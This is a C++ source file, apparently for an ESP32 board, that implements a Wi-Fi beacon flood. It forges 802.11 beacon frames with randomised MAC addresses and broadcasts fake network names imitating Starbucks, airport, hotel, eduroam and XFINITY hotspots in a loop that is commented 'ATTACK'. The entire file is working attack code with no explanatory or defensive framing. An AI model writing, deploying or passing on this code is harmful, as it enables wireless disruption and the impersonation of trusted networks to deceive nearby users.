#include "Attack_Beacon.h"
#include "esp_wifi.h"
#include <WiFi.h>

// Random MAC generator
static void getRandomMac(uint8_t *mac) {
    mac[0] = 0x02; mac[1] = random(256); mac[2] = random(256);
    mac[3] = random(256); mac[4] = random(256); mac[5] = random(256);
}

void StartBeaconFlood() {
    WiFi.mode(WIFI_AP); // AP mode for channel switching 
    esp_wifi_set_promiscuous(true);
}

void RunBeaconFloodLoop() {
    const char* fakes[] = {
        "VODAFONE_E83241", "Starbucks_WiFi", "Airport_Free_WiFi", 
        "Hilton_Honors", "McDonalds_Free_WiFi", "Marriott_Guestz", "Boingo_Hotspot", 
        "iPhone", "EDUROAM", "XFINITY", "Google_Guest"
    };
    
    // Beacon Packet Frame 
    uint8_t packet[128] = { 
        0x80, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 
        0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Src 
        0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // BSSID 
        0xc0, 0x6c, 0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, 0x64, 0x00, 0x01, 0x04
    };

    // Pick a random name and fill the package
    int r = random(5);
    String ssid = fakes[r];
    int len = ssid.length();
    
    uint8_t mac[6]; getRandomMac(mac);
    memcpy(&packet[10], mac, 6); // Source
    memcpy(&packet[16], mac, 6); // BSSID
    
    packet[37] = len;
    for(int i=0; i<len; i++) packet[38+i] = ssid[i];

    // ATTACK/
    for(int k=0; k<3; k++) {
        esp_wifi_80211_tx(WIFI_IF_AP, packet, 38+len, true);
        delay(2);
    }
    delay(10);
}

void StopBeaconFlood() {
    esp_wifi_set_promiscuous(false);
    WiFi.mode(WIFI_STA);
}